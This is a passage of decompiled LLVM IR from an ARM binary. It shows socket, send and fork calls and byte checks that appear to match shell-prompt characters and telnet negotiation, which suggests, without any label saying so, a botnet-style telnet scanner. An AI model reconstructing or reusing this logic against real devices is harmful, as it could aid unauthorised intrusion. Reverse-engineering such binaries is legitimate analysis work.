  store i1 %v7_12a9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12a9c, label %dec_label_pc_12488thread-pre-split, label %dec_label_pc_12aa4

dec_label_pc_12aa4:                               ; preds = %dec_label_pc_12a70, %dec_label_pc_12a9c
  %v0_12ab8 = phi i32 [ %v1_12a9c, %dec_label_pc_12a9c ], [ %v1_12a74, %dec_label_pc_12a70 ]
  %v2_12aa4 = add i32 %v0_12ab8, %v0_12508
  store i32 %v2_12aa4, i32* %r3.global-to-local, align 4
  %v1_12aa8 = add i32 %v2_12aa4, 28
  %v2_12aa8 = inttoptr i32 %v1_12aa8 to i8*
  %v3_12aa8 = load i8, i8* %v2_12aa8, align 1
  %v4_12aa8 = zext i8 %v3_12aa8 to i32
  store i32 %v4_12aa8, i32* %r3.global-to-local, align 4
  %v2_12aac = icmp ugt i8 %v3_12aa8, 61
  store i1 %v2_12aac, i1* %cpsr_c.global-to-local, align 1
  %v7_12aac = icmp eq i8 %v3_12aa8, 62
  store i1 %v7_12aac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12aac, label %dec_label_pc_12ab8, label %bb334

bb334:                                            ; preds = %dec_label_pc_12aa4
  %v3_12ab0 = icmp ugt i8 %v3_12aa8, 57
  store i1 %v3_12ab0, i1* %cpsr_c.global-to-local, align 1
  %v8_12ab0 = icmp eq i8 %v3_12aa8, 58
  store i1 %v8_12ab0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_12ab0, label %dec_label_pc_12ab8, label %dec_label_pc_12a84

dec_label_pc_12ab8:                               ; preds = %dec_label_pc_12aa4, %bb334, %dec_label_pc_12a94, %dec_label_pc_12a8c, %dec_label_pc_12a84
  %v1_12ab8 = add i32 %v0_12ab8, 1
  store i32 %v1_12ab8, i32* @r7, align 4
  %v2_12abc = icmp eq i32 %v1_12ab8, -1
  store i1 %v2_12abc, i1* %cpsr_c.global-to-local, align 1
  %v7_12abc = icmp eq i32 %v0_12ab8, -2
  store i1 %v7_12abc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12abc, label %dec_label_pc_12488thread-pre-split, label %dec_label_pc_12ac4

dec_label_pc_12ac4:                               ; preds = %dec_label_pc_12ab8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12ac4 = icmp eq i32 %v1_12ab8, 0
  store i1 %v2_12ac4, i1* %cpsr_z.global-to-local, align 1
  %tmp335 = icmp slt i32 %v1_12ab8, 1
  br i1 %tmp335, label %dec_label_pc_12618, label %dec_label_pc_12acc

dec_label_pc_12acc:                               ; preds = %dec_label_pc_12ac4
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_12ad0 = call i32 @function_13128(i32 20)
  store i32 %v2_12970, i32* %r1.global-to-local, align 4
  store i32 20, i32* %r0.global-to-local, align 4
  %v3_12ae0 = call i32 @function_13044(i32 20, i32* nonnull %stack_var_-48)
  store i32 %v3_12ae0, i32* %r0.global-to-local, align 4
  %v3_12ae4 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_12ae4, i32* %r2.global-to-local, align 4
  store i32 %v3_12ae0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12af0 = load i32, i32* @r5, align 4
  %v1_12af0 = add i32 %v0_12af0, 4
  %v2_12af0 = inttoptr i32 %v1_12af0 to i32*
  %v3_12af0 = load i32, i32* %v2_12af0, align 4
  store i32 %v3_12af0, i32* %r0.global-to-local, align 4
  %v4_12af4 = call i32 @_send(i32 %v3_12af0, i32 %v3_12ae0, i32 %v3_12ae4, i32 16384)
  store i32 %v4_12af4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12b04 = load i32, i32* @r5, align 4
  %v1_12b04 = add i32 %v0_12b04, 4
  %v2_12b04 = inttoptr i32 %v1_12b04 to i32*
  %v3_12b04 = load i32, i32* %v2_12b04, align 4
  store i32 %v3_12b04, i32* %r0.global-to-local, align 4
  %v4_12b08 = call i32 @_send(i32 %v3_12b04, i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32 2, i32 16384)
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_12b10 = call i32 @function_13070(i32 20)
  store i32 %v1_12b10, i32* %r0.global-to-local, align 4
  %v0_12b14 = load i32, i32* @r5, align 4
  %v1_12b14 = add i32 %v0_12b14, 24
  %v2_12b14 = inttoptr i32 %v1_12b14 to i32*
  %v3_12b14 = load i32, i32* %v2_12b14, align 4
  store i32 %v3_12b14, i32* %ip.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_12b1c = add i32 %v0_12b14, 12
  %v3_12b1c = inttoptr i32 %v2_12b1c to i32*
  store i32 8, i32* %v3_12b1c, align 4
  br label %dec_label_pc_12c58

dec_label_pc_12b24:                               ; preds = %dec_label_pc_12508
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_12b28 = call i32 @function_13128(i32 26)
  store i32 %v2_128bc, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_12b38 = call i32 @function_13044(i32 26, i32* nonnull %stack_var_-56)
  %v3_12b3c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_12b38, i32* %r2.global-to-local, align 4
  %v1_12b44 = add i32 %v3_12b3c, -1
  store i32 %v1_12b44, i32* %r3.global-to-local, align 4
  %v0_12b48 = load i32, i32* @sb, align 4
  store i32 %v0_12b48, i32* %r0.global-to-local, align 4
  %v0_12b4c = load i32, i32* @r5, align 4
  %v1_12b4c = add i32 %v0_12b4c, 24
  %v2_12b4c = inttoptr i32 %v1_12b4c to i32*
  %v3_12b4c = load i32, i32* %v2_12b4c, align 4
  store i32 %v3_12b4c, i32* %r1.global-to-local, align 4
  %v4_12b50 = call i32 @function_13b18(i32 %v0_12b48, i32 %v3_12b4c, i32 %v3_12b38, i32 %v1_12b44)
  %v3_12b54 = icmp eq i32 %v4_12b50, -1
  store i1 %v3_12b54, i1* %cpsr_c.global-to-local, align 1
  %v8_12b54 = icmp eq i32 %v4_12b50, -1
  store i1 %v8_12b54, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_12b60 = call i32 @function_13070(i32 26)
  br i1 %v3_12b54, label %dec_label_pc_12b5c, label %dec_label_pc_12d90

dec_label_pc_12b5c:                               ; preds = %dec_label_pc_12b24
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_12b68 = call i32 @function_13128(i32 25)
  store i32 %v2_128bc, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_12b78 = call i32 @function_13044(i32 25, i32* nonnull %stack_var_-56)
  store i32 %v3_12b78, i32* %r0.global-to-local, align 4
  %v3_12b7c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_12b78, i32* %r2.global-to-local, align 4
  %v1_12b84 = add i32 %v3_12b7c, -1
  store i32 %v1_12b84, i32* %r3.global-to-local, align 4
  %v0_12b88 = load i32, i32* @r5, align 4
  %v1_12b88 = add i32 %v0_12b88, 24
  %v2_12b88 = inttoptr i32 %v1_12b88 to i32*
  %v3_12b88 = load i32, i32* %v2_12b88, align 4
  store i32 %v3_12b88, i32* %r1.global-to-local, align 4
  %v0_12b8c = load i32, i32* @sb, align 4
  store i32 %v0_12b8c, i32* %r0.global-to-local, align 4
  %v4_12b90 = call i32 @function_13b18(i32 %v0_12b8c, i32 %v3_12b88, i32 %v3_12b78, i32 %v1_12b84)
  store i32 %v4_12b90, i32* @r7, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_12b9c = call i32 @function_13070(i32 25)
  store i32 %v1_12b9c, i32* %r0.global-to-local, align 4
  %v0_12ba0 = load i32, i32* @r7, align 4
  %v2_12ba0 = icmp eq i32 %v0_12ba0, -1
  store i1 %v2_12ba0, i1* %cpsr_c.global-to-local, align 1
  %v7_12ba0 = icmp eq i32 %v0_12ba0, -1
  store i1 %v7_12ba0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12ba0, label %dec_label_pc_12484.loopexit, label %dec_label_pc_12ba8

dec_label_pc_12ba8:                               ; preds = %dec_label_pc_12b5c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12ba8 = icmp eq i32 %v0_12ba0, 0
  store i1 %v2_12ba8, i1* %cpsr_z.global-to-local, align 1
  %tmp336 = icmp slt i32 %v0_12ba0, 1
  br i1 %tmp336, label %dec_label_pc_12618, label %dec_label_pc_12bb0

dec_label_pc_12bb0:                               ; preds = %dec_label_pc_12ba8
  %v0_12bb0 = load i32, i32* @r5, align 4
  %v1_12bb0 = add i32 %v0_12bb0, 21
  %v2_12bb0 = inttoptr i32 %v1_12bb0 to i8*
  %v3_12bb0 = load i8, i8* %v2_12bb0, align 1
  %v4_12bb0 = zext i8 %v3_12bb0 to i32
  store i32 %v4_12bb0, i32* %r3.global-to-local, align 4
  %v1_12bb4 = add i32 %v0_12bb0, 20
  %v2_12bb4 = inttoptr i32 %v1_12bb4 to i8*
  %v3_12bb4 = load i8, i8* %v2_12bb4, align 1
  %v4_12bb4 = zext i8 %v3_12bb4 to i32
  store i32 %v4_12bb4, i32* %r2.global-to-local, align 4
  %v1_12bb8 = add i32 %v0_12bb0, 16
  %v2_12bb8 = inttoptr i32 %v1_12bb8 to i32*
  %v3_12bb8 = load i32, i32* %v2_12bb8, align 4
  store i32 %v3_12bb8, i32* %r1.global-to-local, align 4
  %v4_12bbc = mul nuw nsw i32 %v4_12bb0, 256
  %v5_12bbc = or i32 %v4_12bb4, %v4_12bbc
  store i32 %v5_12bbc, i32* %r2.global-to-local, align 4
  %v1_12bc0 = and i32 %v4_12bb4, 128
  %v2_12bc0 = icmp ne i32 %v1_12bc0, 0
  store i1 %v2_12bc0, i1* %cpsr_c.global-to-local, align 1
  store i32 %v4_12bb0, i32* %r3.global-to-local, align 4
  store i32 %v3_12bb8, i32* %stack_var_-48, align 4
  store i32 %v5_12bbc, i32* %stack_var_-38, align 4
  %v1_12bd0 = inttoptr i32 %v0_12bb0 to i32*
  %v2_12bd0 = load i32, i32* %v1_12bd0, align 4
  store i32 %v2_12bd0, i32* @fp, align 4
  %v0_12bd4 = call i32 @fork()
  store i32 %v0_12bd4, i32* %r0.global-to-local, align 4
  %v7_12bd8 = icmp eq i32 %v0_12bd4, -1
  %.352 = zext i1 %v7_12bd8 to i32
  store i32 %.352, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12be4 = icmp eq i32 %v0_12bd4, 0
  store i1 %v2_12be4, i1* %cpsr_z.global-to-local, align 1
  %tmp339 = icmp slt i32 %v0_12bd4, 1
  br i1 %tmp339, label %bb340, label %.thread69

.thread69:                                        ; preds = %dec_label_pc_12bb0
  store i32 1, i32* %sl.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12c3c

bb340:                                            ; preds = %dec_label_pc_12bb0
  store i32 %.352, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12bf0 = icmp eq i1 %v7_12bd8, false
  store i1 %v2_12bf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12bf0, label %dec_label_pc_12bf8, label %dec_label_pc_12c3c

dec_label_pc_12bf8:                               ; preds = %bb340
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_12c04 = call i32 @_socket(i32 2, i32 1, i32 0)
  store i32 %v3_12c04, i32* %r0.global-to-local, align 4
  %v2_12c08 = icmp eq i32 %v3_12c04, -1
  store i1 %v2_12c08, i1* %cpsr_c.global-to-local, align 1
  %v7_12c08 = icmp eq i32 %v3_12c04, -1
  store i1 %v7_12c08, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_12c04, i32* @r6, align 4
  br i1 %v7_12c08, label %dec_label_pc_1303c, label %dec_label_pc_12c14

dec_label_pc_12c14:                               ; preds = %dec_label_pc_12bf8
  store i32 18, i32* %r0.global-to-local, align 4
  %v1_12c18 = call i32 @function_13128(i32 18)
  store i32 19, i32* %r0.global-to-local, align 4
  %v1_12c20 = call i32 @function_13128(i32 19)
  %v0_12c24 = load i32, i32* @sl, align 4
  store i32 %v0_12c24, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r0.global-to-local, align 4
  %v2_12c2c = inttoptr i32 %v0_12c24 to i32*
  %v3_12c2c = call i32 @function_13044(i32 18, i32* %v2_12c2c)
  store i32 %v3_12c2c, i32* %r0.global-to-local, align 4
  %v1_12c30 = inttoptr i32 %v3_12c2c to i8*
  %v2_12c30 = call i32 @function_10ebc(i8* %v1_12c30)
  store i32 %v2_12c30, i32* %r0.global-to-local, align 4
  store i32 %v2_12c30, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_12c34 = icmp eq i32 %v2_12c30, 0
  store i1 %v3_12c34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_12c34, label %dec_label_pc_12c3c, label %dec_label_pc_12f0c

dec_label_pc_12c3c:                               ; preds = %.thread69, %dec_label_pc_12c14, %bb340
  %v0_12c3c = load i32, i32* @r5, align 4
  %v1_12c3c = add i32 %v0_12c3c, 4
  %v2_12c3c = inttoptr i32 %v1_12c3c to i32*
  %v3_12c3c = load i32, i32* %v2_12c3c, align 4
  store i32 %v3_12c3c, i32* %r0.global-to-local, align 4
  %v1_12c40 = call i32 @close(i32 %v3_12c3c)
  store i32 %v1_12c40, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_12c4c = load i32, i32* @r5, align 4
  %v1_12c4c = add i32 %v0_12c4c, 24
  %v2_12c4c = inttoptr i32 %v1_12c4c to i32*
  %v3_12c4c = load i32, i32* %v2_12c4c, align 4
  store i32 %v3_12c4c, i32* %ip.global-to-local, align 4
  %v2_12c50 = add i32 %v0_12c4c, 4
  %v3_12c50 = inttoptr i32 %v2_12c50 to i32*
  store i32 -1, i32* %v3_12c50, align 4
  %v0_12c54 = load i32, i32* %r2.global-to-local, align 4
  %v1_12c54 = load i32, i32* @r5, align 4
  %v2_12c54 = add i32 %v1_12c54, 12
  %v3_12c54 = inttoptr i32 %v2_12c54 to i32*
  store i32 %v0_12c54, i32* %v3_12c54, align 4
  br label %dec_label_pc_12c58

dec_label_pc_12c58:                               ; preds = %.thread205, %dec_label_pc_12cd8, %dec_label_pc_12ea8, %dec_label_pc_12dc0, %dec_label_pc_12acc, %dec_label_pc_12a18, %dec_label_pc_12964, %dec_label_pc_128b0, %dec_label_pc_12818, %dec_label_pc_12788, %dec_label_pc_12620, %dec_label_pc_12c3c
  %v0_12c58 = load i32, i32* %ip.global-to-local, align 4
  %v1_12c58 = load i32, i32* @r7, align 4
  %v2_12c58 = sub i32 %v0_12c58, %v1_12c58
  %v3_12c58 = icmp uge i32 %v0_12c58, %v1_12c58
  store i1 %v3_12c58, i1* %cpsr_c.global-to-local, align 1
  %v4_12c58 = xor i32 %v1_12c58, %v0_12c58
  %v5_12c58 = xor i32 %v2_12c58, %v0_12c58
  %v6_12c58 = and i32 %v5_12c58, %v4_12c58
  %v7_12c58 = icmp slt i32 %v6_12c58, 0
  %v8_12c58 = icmp slt i32 %v2_12c58, 0
  %v9_12c58 = icmp eq i32 %v0_12c58, %v1_12c58
  store i1 %v9_12c58, i1* %cpsr_z.global-to-local, align 1
  %v2_12c5c = xor i1 %v8_12c58, %v7_12c58
  %v0_12c58.v1_12c58 = select i1 %v2_12c5c, i32 %v0_12c58, i32 %v1_12c58
  store i32 %v0_12c58.v1_12c58, i32* %r1.global-to-local, align 4
  %v2_12c64 = sub i32 %v0_12c58, %v0_12c58.v1_12c58
  store i32 %v2_12c64, i32* %r2.global-to-local, align 4
  %v1_12c68 = load i32, i32* @r5, align 4
  %v2_12c68 = add i32 %v1_12c68, 24
  %v3_12c68 = inttoptr i32 %v2_12c68 to i32*
  store i32 %v2_12c64, i32* %v3_12c68, align 4
  %v0_12c6c = load i32, i32* @sb, align 4
  %v1_12c6c = load i32, i32* %r1.global-to-local, align 4
  %v2_12c6c = add i32 %v1_12c6c, %v0_12c6c
  store i32 %v2_12c6c, i32* %r1.global-to-local, align 4
  store i32 %v0_12c6c, i32* %r0.global-to-local, align 4
  %v3_12c74 = call i32 @_memmove(i32 %v0_12c6c, i32 %v2_12c6c, i32 %v2_12c64)
  store i32 %v3_12c74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12508

dec_label_pc_12c7c:                               ; preds = %dec_label_pc_12508
  %v1_12c7c = add i32 %v0_12508, 24
  %v2_12c7c = inttoptr i32 %v1_12c7c to i32*
  %v3_12c7c = load i32, i32* %v2_12c7c, align 4
  store i32 %v3_12c7c, i32* %ip.global-to-local, align 4
  %v1_12c80 = add i32 %v3_12c7c, -1
  store i32 %v1_12c80, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12c84 = icmp eq i32 %v1_12c80, 0
  store i1 %v2_12c84, i1* %cpsr_z.global-to-local, align 1
  %v5_12c88 = icmp sgt i32 %v1_12c80, 0
  br i1 %v5_12c88, label %dec_label_pc_12cb0, label %dec_label_pc_12488thread-pre-split.thread

dec_label_pc_12c90:                               ; preds = %bb343
  %v2_12c90 = icmp ugt i8 %v3_12cb4, 35
  store i1 %v2_12c90, i1* %cpsr_c.global-to-local, align 1
  %v7_12c90 = icmp eq i8 %v3_12cb4, 36
  store i1 %v7_12c90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12c90, label %dec_label_pc_12cc4, label %dec_label_pc_12c98

dec_label_pc_12c98:                               ; preds = %dec_label_pc_12c90
  %v2_12c98 = icmp ugt i8 %v3_12cb4, 34
  store i1 %v2_12c98, i1* %cpsr_c.global-to-local, align 1
  %v7_12c98 = icmp eq i8 %v3_12cb4, 35
  store i1 %v7_12c98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12c98, label %dec_label_pc_12cc4, label %dec_label_pc_12ca0

dec_label_pc_12ca0:                               ; preds = %dec_label_pc_12c98
  %v2_12ca0 = icmp ugt i8 %v3_12cb4, 36
  store i1 %v2_12ca0, i1* %cpsr_c.global-to-local, align 1
  %v7_12ca0 = icmp eq i8 %v3_12cb4, 37
  store i1 %v7_12ca0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12ca0, label %dec_label_pc_12cc4, label %dec_label_pc_12ca8

dec_label_pc_12ca8:                               ; preds = %dec_label_pc_12ca0
  %v1_12ca8 = add i32 %v0_12cc4, -1
  store i32 %v1_12ca8, i32* %r0.global-to-local, align 4
  %v2_12ca8 = icmp ne i32 %v0_12cc4, 0
  store i1 %v2_12ca8, i1* %cpsr_c.global-to-local, align 1
  %v7_12ca8 = icmp eq i32 %v0_12cc4, 1
  store i1 %v7_12ca8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12ca8, label %dec_label_pc_12488thread-pre-split, label %dec_label_pc_12cb0

dec_label_pc_12cb0:                               ; preds = %dec_label_pc_12c7c, %dec_label_pc_12ca8
  %v0_12cc4 = phi i32 [ %v1_12ca8, %dec_label_pc_12ca8 ], [ %v1_12c80, %dec_label_pc_12c7c ]
  %v2_12cb0 = add i32 %v0_12cc4, %v0_12508
  store i32 %v2_12cb0, i32* %r3.global-to-local, align 4
  %v1_12cb4 = add i32 %v2_12cb0, 28
  %v2_12cb4 = inttoptr i32 %v1_12cb4 to i8*
  %v3_12cb4 = load i8, i8* %v2_12cb4, align 1
  %v4_12cb4 = zext i8 %v3_12cb4 to i32
  store i32 %v4_12cb4, i32* %r3.global-to-local, align 4
  %v2_12cb8 = icmp ugt i8 %v3_12cb4, 61
  store i1 %v2_12cb8, i1* %cpsr_c.global-to-local, align 1
  %v7_12cb8 = icmp eq i8 %v3_12cb4, 62
  store i1 %v7_12cb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12cb8, label %dec_label_pc_12cc4, label %bb343

bb343:                                            ; preds = %dec_label_pc_12cb0
  %v3_12cbc = icmp ugt i8 %v3_12cb4, 57
  store i1 %v3_12cbc, i1* %cpsr_c.global-to-local, align 1
  %v8_12cbc = icmp eq i8 %v3_12cb4, 58
  store i1 %v8_12cbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_12cbc, label %dec_label_pc_12cc4, label %dec_label_pc_12c90

dec_label_pc_12cc4:                               ; preds = %dec_label_pc_12cb0, %bb343, %dec_label_pc_12ca0, %dec_label_pc_12c98, %dec_label_pc_12c90
  %v1_12cc4 = add i32 %v0_12cc4, 1
  store i32 %v1_12cc4, i32* @r7, align 4
  %v2_12cc8 = icmp eq i32 %v1_12cc4, -1
  store i1 %v2_12cc8, i1* %cpsr_c.global-to-local, align 1
  %v7_12cc8 = icmp eq i32 %v0_12cc4, -2
  store i1 %v7_12cc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12cc8, label %dec_label_pc_12488thread-pre-split, label %dec_label_pc_12cd0

dec_label_pc_12cd0:                               ; preds = %dec_label_pc_12cc4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12cd0 = icmp eq i32 %v1_12cc4, 0
  store i1 %v2_12cd0, i1* %cpsr_z.global-to-local, align 1
  %tmp344 = icmp slt i32 %v1_12cc4, 1
  br i1 %tmp344, label %dec_label_pc_12618, label %dec_label_pc_12cd8

dec_label_pc_12cd8:                               ; preds = %dec_label_pc_12cd0
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_12cdc = call i32 @function_13128(i32 24)
  store i32 %v2_128bc, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v3_12cec = call i32 @function_13044(i32 24, i32* nonnull %stack_var_-56)
  store i32 %v3_12cec, i32* %r0.global-to-local, align 4
  %v3_12cf0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_12cf0, i32* %r2.global-to-local, align 4
  store i32 %v3_12cec, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12cfc = load i32, i32* @r5, align 4
  %v1_12cfc = add i32 %v0_12cfc, 4
  %v2_12cfc = inttoptr i32 %v1_12cfc to i32*
  %v3_12cfc = load i32, i32* %v2_12cfc, align 4
  store i32 %v3_12cfc, i32* %r0.global-to-local, align 4
  %v4_12d00 = call i32 @_send(i32 %v3_12cfc, i32 %v3_12cec, i32 %v3_12cf0, i32 16384)
  store i32 %v4_12d00, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12d10 = load i32, i32* @r5, align 4
  %v1_12d10 = add i32 %v0_12d10, 4
  %v2_12d10 = inttoptr i32 %v1_12d10 to i32*
  %v3_12d10 = load i32, i32* %v2_12d10, align 4
  store i32 %v3_12d10, i32* %r0.global-to-local, align 4
  %v4_12d14 = call i32 @_send(i32 %v3_12d10, i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32 2, i32 16384)
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_12d1c = call i32 @function_13070(i32 24)
  store i32 %v1_12d1c, i32* %r0.global-to-local, align 4
  %v0_12d20 = load i32, i32* @r5, align 4
  %v1_12d20 = add i32 %v0_12d20, 24
  %v2_12d20 = inttoptr i32 %v1_12d20 to i32*
  %v3_12d20 = load i32, i32* %v2_12d20, align 4
  store i32 %v3_12d20, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v2_12d28 = add i32 %v0_12d20, 12
  %v3_12d28 = inttoptr i32 %v2_12d28 to i32*
  store i32 10, i32* %v3_12d28, align 4
  br label %dec_label_pc_12c58

dec_label_pc_12d30:                               ; preds = %dec_label_pc_12598
  store i32 ptrtoint (i32* @global_var_1465a.387 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_12550, i32* %r0.global-to-local, align 4
  %v3_12d3c = call i32 @_memcpy(i32 %v2_12550, i32 ptrtoint (i32* @global_var_1465a.387 to i32), i32 3)
  store i32 9, i32* %r2.global-to-local, align 4
  store i32 %v2_12d48, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14651.389 to i32), i32* %r1.global-to-local, align 4
  %v3_12d50 = call i32 @_memcpy(i32 %v2_12d48, i32 ptrtoint (i32* @global_var_14651.389 to i32), i32 9)
  store i32 %v3_12d50, i32* %r0.global-to-local, align 4
  %v0_12d54 = load i32, i32* @r5, align 4
  %v1_12d54 = add i32 %v0_12d54, 24
  %v2_12d54 = inttoptr i32 %v1_12d54 to i32*
  %v3_12d54 = load i32, i32* %v2_12d54, align 4
  store i32 %v3_12d54, i32* %ip.global-to-local, align 4
  %v0_12d58 = load i32, i32* @r6, align 4
  %v1_12d58 = add i32 %v0_12d58, 2
  store i32 %v1_12d58, i32* %r2.global-to-local, align 4
  %v0_12d5c = load i32, i32* @sb, align 4
  %v2_12d5c = add i32 %v0_12d5c, %v3_12d54
  store i32 %v2_12d5c, i32* %r3.global-to-local, align 4
  %v3_12d60 = icmp uge i32 %v2_12d5c, %v1_12d58
  store i1 %v3_12d60, i1* %cpsr_c.global-to-local, align 1
  %v9_12d60 = icmp eq i32 %v2_12d5c, %v1_12d58
  store i1 %v9_12d60, i1* %cpsr_z.global-to-local, align 1
  %v2_12d64 = xor i1 %v3_12d60, true
  %v3_12d64 = or i1 %v9_12d60, %v2_12d64
  br i1 %v3_12d64, label %dec_label_pc_12d30.dec_label_pc_12608.loopexit_crit_edge, label %dec_label_pc_12d68

dec_label_pc_12d30.dec_label_pc_12608.loopexit_crit_edge: ; preds = %dec_label_pc_12d30
  %v0_12608.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_12608

dec_label_pc_12d68:                               ; preds = %dec_label_pc_12d30
  %v0_12d68 = load i32, i32* @r4, align 4
  %v1_12d68 = add i32 %v0_12d68, 1
  %v2_12d68 = inttoptr i32 %v1_12d68 to i8*
  %v3_12d68 = load i8, i8* %v2_12d68, align 1
  %v4_12d68 = zext i8 %v3_12d68 to i32
  store i32 %v4_12d68, i32* %r3.global-to-local, align 4
  %v2_12d6c = icmp ugt i8 %v3_12d68, 30
  store i1 %v2_12d6c, i1* %cpsr_c.global-to-local, align 1
  %v7_12d6c = icmp eq i8 %v3_12d68, 31
  store i1 %v7_12d6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12d6c, label %dec_label_pc_12e5c, label %dec_label_pc_12d74

dec_label_pc_12d74:                               ; preds = %dec_label_pc_12d68
  %v1_12d74 = add i32 %v0_12d68, -1
  %v2_12d74 = inttoptr i32 %v1_12d74 to i8*
  %v3_12d74 = load i8, i8* %v2_12d74, align 1
  %v4_12d74 = zext i8 %v3_12d74 to i32
  store i32 %v4_12d74, i32* %r3.global-to-local, align 4
  %v2_12d78 = icmp ugt i8 %v3_12d74, -4
  store i1 %v2_12d78, i1* %cpsr_c.global-to-local, align 1
  %v7_12d78 = icmp eq i8 %v3_12d74, -3
  store i1 %v7_12d78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12d78, label %bb345, label %dec_label_pc_12d84

bb345:                                            ; preds = %dec_label_pc_12d74
  %v1_12d7c = load i32, i32* @r8, align 4
  %v2_12d7c = trunc i32 %v1_12d7c to i8
  store i8 %v2_12d7c, i8* %v2_12d74, align 1
  %v0_12d80.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12d80.pr, label %dec_label_pc_125ac, label %.dec_label_pc_12d84_crit_edge

.dec_label_pc_12d84_crit_edge:                    ; preds = %bb345
  %v0_12d84.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12d84

dec_label_pc_12d84:                               ; preds = %.dec_label_pc_12d84_crit_edge, %dec_label_pc_12d74
  %v0_12d84 = phi i32 [ %v0_12d84.pre, %.dec_label_pc_12d84_crit_edge ], [ %v4_12d74, %dec_label_pc_12d74 ]
  %v2_12d84 = icmp ugt i32 %v0_12d84, 250
  store i1 %v2_12d84, i1* %cpsr_c.global-to-local, align 1
  %v7_12d84 = icmp eq i32 %v0_12d84, 251
  store i1 %v7_12d84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12d84, label %bb346, label %dec_label_pc_125ac

bb346:                                            ; preds = %dec_label_pc_12d84
  %v1_12d88 = load i32, i32* %sl.global-to-local, align 4
  %v2_12d88 = trunc i32 %v1_12d88 to i8
  %v3_12d88 = load i32, i32* @r4, align 4
  %v4_12d88 = add i32 %v3_12d88, -1
  %v5_12d88 = inttoptr i32 %v4_12d88 to i8*
  store i8 %v2_12d88, i8* %v5_12d88, align 1
  br label %dec_label_pc_125ac

dec_label_pc_12d90:                               ; preds = %dec_label_pc_12b24
  store i32 %v1_12b60, i32* %r0.global-to-local, align 4
  %v0_12d98 = load i32, i32* @r5, align 4
  %v1_12d98 = add i32 %v0_12d98, 4
  %v2_12d98 = inttoptr i32 %v1_12d98 to i32*
  %v3_12d98 = load i32, i32* %v2_12d98, align 4
  store i32 %v3_12d98, i32* %r0.global-to-local, align 4
  %v1_12d9c = call i32 @close(i32 %v3_12d98)
  store i32 %v1_12d9c, i32* %r0.global-to-local, align 4
  %v0_12da0 = load i32, i32* @r5, align 4
  %v1_12da0 = add i32 %v0_12da0, 284
